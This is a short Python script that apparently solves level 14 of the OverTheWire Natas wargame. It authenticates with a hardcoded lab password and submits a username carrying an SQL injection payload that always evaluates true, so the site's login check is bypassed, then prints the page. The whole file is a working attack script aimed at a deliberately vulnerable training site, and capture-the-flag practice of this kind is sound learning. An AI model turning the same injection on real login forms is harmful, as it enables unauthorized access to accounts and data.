import requests

username = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url = "http://natas14.natas.labs.overthewire.org/"

session = requests.Session()

response = session.post(url, data = {"username" : 'salam" OR 1=1 #', "password": "banoo"}, auth=(username, password)) 

print(response.text)


